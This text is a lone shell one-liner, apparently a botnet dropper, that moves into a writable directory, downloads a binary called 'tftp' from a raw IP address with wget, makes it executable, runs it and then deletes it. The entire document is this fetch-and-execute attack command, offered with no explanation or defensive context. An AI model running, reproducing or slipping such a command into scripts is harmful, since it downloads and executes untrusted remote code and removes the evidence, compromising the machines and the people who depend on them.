cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://70.32.24.114/tftp; chmod +x tftp; ./tftp; rm -rf tftp
